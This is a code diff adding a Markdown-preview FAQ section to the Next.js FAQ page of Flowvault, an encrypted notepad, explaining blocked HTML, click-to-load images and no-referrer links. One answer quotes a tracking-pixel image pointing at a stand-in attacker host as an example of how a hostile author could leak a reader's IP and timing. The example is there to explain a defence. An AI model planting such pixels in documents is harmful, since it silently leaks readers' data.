@@ -5,9 +5,9 @@ import Link from "next/link";
 import { DONATE_PATH, APP_URL } from "@/lib/config";
 
 const FAQ_TITLE =
-  "FAQ — Flowvault: encrypted online notepad, Bring-Your-Own-Storage local vaults, trusted handover to a beneficiary, time-locked notes, Encrypted Send, encrypted backup & restore; ProtectedText / Standard Notes / CryptPad / Privnote / Bitwarden Send alternative";
+  "FAQ — Flowvault: encrypted online notepad, Markdown preview, Bring-Your-Own-Storage local vaults, trusted handover to a beneficiary, time-locked notes, Encrypted Send, encrypted backup & restore; ProtectedText / Standard Notes / CryptPad / Privnote / Bitwarden Send alternative";
 const FAQ_DESCRIPTION =
-  "Honest answers about Flowvault: how plausible-deniability hidden volumes work, how Bring-Your-Own-Storage local vaults keep the entire ciphertext on your own disk as a single .flowvault file, how the trusted handover releases a vault to a beneficiary if you stop checking in, how drand-backed time-locked notes keep messages sealed until a future date, how Encrypted Send creates self-destructing one-time links with view caps and optional passwords, how zero-knowledge .fvault backup and restore let you migrate or self-host without decrypting anything server-side, and how Flowvault compares to ProtectedText, Standard Notes, CryptPad, Privnote, OneTimeSecret, PrivateBin, Yopass, Notesnook, Joplin, Obsidian, Bitwarden Send, 1Password Share, and Skiff Notes.";
+  "Honest answers about Flowvault: how plausible-deniability hidden volumes work, how the new Markdown preview renders GitHub-flavored Markdown safely (HTML blocked, external images click-to-load, no-referrer links, syntax-highlighted code), how Bring-Your-Own-Storage local vaults keep the entire ciphertext on your own disk as a single .flowvault file, how the trusted handover releases a vault to a beneficiary if you stop checking in, how drand-backed time-locked notes keep messages sealed until a future date, how Encrypted Send creates self-destructing one-time links with view caps and optional passwords, how zero-knowledge .fvault backup and restore let you migrate or self-host without decrypting anything server-side, and how Flowvault compares to ProtectedText, Standard Notes, CryptPad, Privnote, OneTimeSecret, PrivateBin, Yopass, Notesnook, Joplin, Obsidian, Bitwarden Send, 1Password Share, and Skiff Notes.";
 
 export const metadata: Metadata = {
   title: FAQ_TITLE,
@@ -60,6 +60,13 @@ export const metadata: Metadata = {
     "encrypted notes stored on my own device",
     "S3 encrypted notes backend",
     "WebDAV encrypted notes backend",
+    "markdown preview encrypted notes",
+    "GitHub flavored markdown notepad",
+    "encrypted notepad code highlighting",
+    "zero knowledge markdown editor",
+    "markdown notes without external images",
+    "no-referrer markdown preview",
+    "prism syntax highlighting encrypted notes",
   ],
   alternates: { canonical: "/faq" },
   openGraph: {
@@ -930,6 +937,205 @@ const FEATURES: QA[] = [
   },
 ];
 
+const MARKDOWN: QA[] = [
+  {
+    q: "Does Flowvault render Markdown?",
+    a: (
+      <>
+        Yes. As of v1.3, every notebook renders as GitHub-flavored
+        Markdown in a <Strong>Preview</Strong> or <Strong>Split</Strong>{" "}
+        view. A small segmented toggle in the editor toolbar flips
+        between Edit, Preview, and Split; the textarea is still the
+        source of truth and your notes are still plain text under the
+        hood. Preference persists per device in <Code>localStorage</Code>{" "}
+        (not in the encrypted blob, so it doesn&apos;t eat into your
+        512 KiB slot).
+      </>
+    ),
+  },
+  {
+    q: "Which Markdown flavor / features are supported?",
+    a: (
+      <>
+        <Strong>GitHub-flavored Markdown</Strong> via{" "}
+        <Code>react-markdown</Code> + <Code>remark-gfm</Code>:
+        <ul className="mt-2 list-disc space-y-1 pl-5">
+          <li>
+            Headings (<Code># … ######</Code>), paragraphs, line breaks
+          </li>
+          <li>
+            Bold, italic, strikethrough (<Code>~~like this~~</Code>)
+          </li>
+          <li>
+            Ordered and unordered lists, including{" "}
+            <Strong>GFM task lists</Strong> (
+            <Code>- [x] done</Code>)
+          </li>
+          <li>Tables, blockquotes, horizontal rules</li>
+          <li>
+            Inline code and <Strong>fenced code blocks</Strong> with
+            per-language Prism syntax highlighting (<Code>ts</Code>,
+            <Code>py</Code>, <Code>rs</Code>, <Code>go</Code>,{" "}
+            <Code>bash</Code>, <Code>json</Code>, and the rest of the
+            usual crew)
+          </li>
+          <li>
+            Autolinks (<Code>&lt;https://…&gt;</Code>) and standard{" "}
+            <Code>[label](url)</Code> links
+          </li>
+          <li>Images, with the safety gate described below</li>
+        </ul>
+        <p className="mt-3">
+          The preview ships without Mermaid diagrams or KaTeX math
+          on purpose &mdash; both would pull in large extra bundles
+          for a niche use case. If you need either, let us know via
+          GitHub.
+        </p>
+      </>
+    ),
+  },
+  {
+    q: "Is the Markdown preview zero-knowledge too?",
+    a: (
+      <>
+        Yes. Rendering happens entirely in your browser, after the
+        slot is decrypted locally. Flowvault&apos;s server sees only
+        the same opaque ciphertext as before &mdash; it never sees
+        your Markdown source or the rendered HTML. The renderer
+        bundle (~90 KB) is lazy-loaded via <Code>next/dynamic</Code>,
+        so even the <em>decision</em> to use Markdown isn&apos;t
+        reported to anyone: users who stay in Edit mode never
+        download it.
+      </>
+    ),
+  },
+  {
+    q: "Why can't I embed <script>, <iframe>, or arbitrary HTML in my notes?",
+    a: (
+      <>
+        By design: raw HTML is <Strong>blocked</Strong> in the
+        preview. Anything that looks like an HTML tag renders as
+        literal text, not as an element. There is no toggle to
+        enable raw HTML, and there won&apos;t be.
+        <p className="mt-3">
+          Two reasons. First, Flowvault&apos;s whole value prop is
+          &ldquo;the server cannot read your notes.&rdquo; That guarantee
+          collapses the moment a rendered <Code>&lt;script&gt;</Code>{" "}
+          tag can exfiltrate your plaintext back out of the browser.
+          Second, vaults can be handed over (trusted handover) or
+          imported from a <Code>.fvault</Code> someone sent you;
+          rendering arbitrary HTML from a notebook you didn&apos;t
+          author is self-XSS waiting to happen. Keeping Markdown
+          strict keeps the feature safe for beneficiaries and anyone
+          collaborating via shared URL too.
+        </p>
+      </>
+    ),
+  },
+  {
+    q: "Why do external images show a \"Load image\" button instead of just appearing?",
+    a: (
+      <>
+        Because a Markdown image is an HTTP request, and an HTTP
+        request is an opportunity to leak data. A hostile author (or
+        someone who coerced a beneficiary&apos;s vault into their
+        own hands, then returned it) could drop{" "}
+        <Code>![](https://attacker.example/pixel?v=target)</Code>{" "}
+        into your notes, and the moment you unlocked the vault with
+        preview enabled, your IP / user-agent / exact-to-the-second
+        timing would ping their server.
+        <p className="mt-3">
+          Flowvault blocks that quiet channel. External images
+          render as a placeholder showing the exact URL they would
+          load, with a <Strong>Load image</Strong> button that
+          explicitly notes &ldquo;sends a request to the host.&rdquo;
+          You get full informed consent before any pixel crosses
+          the network, and when you do load it we still set{" "}
+          <Code>referrerPolicy=&quot;no-referrer&quot;</Code>, so
+          the host never learns which Flowvault URL or local vault
+          was the source.
+        </p>
+        <p className="mt-3">
+          Inline base64 <Code>data:</Code> images render
+          immediately, because they&apos;re part of the vault
+          bytes &mdash; no network request, no leak.
+        </p>
+      </>
+    ),
+  },
+  {
+    q: "What about external links — do they leak my vault URL as the referrer?",
+    a: (
+      <>
+        No. Every external link the preview renders is hardened with{" "}
+        <Code>target=&quot;_blank&quot;</Code>,{" "}
+        <Code>rel=&quot;noopener noreferrer&quot;</Code>, and{" "}
+        <Code>referrerPolicy=&quot;no-referrer&quot;</Code>. The
+        destination site sees a normal click but cannot tell it
+        came from Flowvault, let alone which slug or local file.
+      </>
+    ),
+  },
+  {
+    q: "Does syntax highlighting hit the network?",
+    a: (
+      <>
+        No. Code blocks are highlighted locally by{" "}
+        <Code>prism-react-renderer</Code>, which ships as part of
+        the lazy-loaded preview bundle. No remote theme fetch, no
+        WebAssembly download, no &ldquo;pick a language on first
+        render&rdquo; round-trip. Flowvault&apos;s no-third-party
+        posture extends to the rendering layer.
+      </>
+    ),
+  },
+  {
+    q: "Can I still edit my notes as plain text?",
+    a: (
+      <>
+        Yes &mdash; the textarea is the editor. Markdown is just a{" "}
+        <em>view</em> over the same bytes. Switching between Edit,
+        Preview, and Split doesn&apos;t change what gets saved;
+        it changes what you see. If you never touch the toggle,
+        Flowvault works exactly like before, and your{" "}
+        <Code>.fvault</Code> backups and plaintext{" "}
+        <Code>.md</Code> / <Code>.zip</Code> exports are identical
+        byte-for-byte.
+      </>
+    ),
+  },
+  {
+    q: "Does Split view work on my phone?",
+    a: (
+      <>
+        Below ~900 px viewport width, the Split toggle hides
+        automatically and Split collapses to Preview (or Edit,
+        whichever you last chose). Your <em>preference</em> stays
+        &ldquo;split&rdquo; so resizing back up to a wide viewport
+        restores the layout without you toggling again. The
+        textarea and preview both scroll independently so the
+        experience on narrow screens is at least usable.
+      </>
+    ),
+  },
+  {
+    q: "Is there a WYSIWYG Markdown editor?",
+    a: (
+      <>
+        No, intentionally. A live WYSIWYG layer would mean shipping
+        a much bigger dependency (TipTap / ProseMirror / Lexical)
+        and would blur what&apos;s actually getting encrypted. One
+        of Flowvault&apos;s design properties is &ldquo;your notes
+        are plain Markdown text, not a proprietary JSON tree&rdquo;
+        &mdash; which keeps export portable and keeps the
+        serialisation simple. Edit / Preview / Split is the
+        compromise that gives you rendering without hiding the
+        source.
+      </>
+    ),
+  },
+];
+
 const BYOS: QA[] = [
   {
     q: "What is Bring Your Own Storage (BYOS) in Flowvault?",
@@ -1627,6 +1833,7 @@ export default function FAQPage() {
     SECURITY,
     FEATURES,
     USAGE,
+    MARKDOWN,
     BYOS,
     BACKUP,
     COMPANY,
@@ -1640,14 +1847,17 @@ export default function FAQPage() {
         </h1>
         <p className="mt-3 text-muted">
           Questions we get (or expect to get) about our zero-knowledge
-          encrypted notepad, Bring-Your-Own-Storage local vaults
-          stored as a single <Code>.flowvault</Code> file on your
-          device, the trusted handover to a beneficiary, drand-backed
-          time-locked notes, Encrypted Send, <Code>.fvault</Code>{" "}
-          encrypted backups and restore, and how Flowvault compares to
-          ProtectedText, Standard Notes, CryptPad, and other
-          alternatives. If yours isn&apos;t here, open an issue on
-          GitHub.
+          encrypted notepad, the Markdown preview with
+          security-first defaults (blocked HTML, click-to-load
+          external images, no-referrer external links,
+          locally-highlighted code blocks),
+          Bring-Your-Own-Storage local vaults stored as a single{" "}
+          <Code>.flowvault</Code> file on your device, the trusted
+          handover to a beneficiary, drand-backed time-locked notes,
+          Encrypted Send, <Code>.fvault</Code> encrypted backups and
+          restore, and how Flowvault compares to ProtectedText,
+          Standard Notes, CryptPad, and other alternatives. If yours
+          isn&apos;t here, open an issue on GitHub.
         </p>
 
         <Section title="About Flowvault" items={ABOUT} />
@@ -1661,6 +1871,10 @@ export default function FAQPage() {
           items={FEATURES}
         />
         <Section title="Using Flowvault" items={USAGE} />
+        <Section
+          title="Markdown preview & syntax-highlighted code blocks"
+          items={MARKDOWN}
+        />
         <Section
           title="Bring Your Own Storage (local .flowvault files; S3 / WebDAV on the roadmap)"
           items={BYOS}
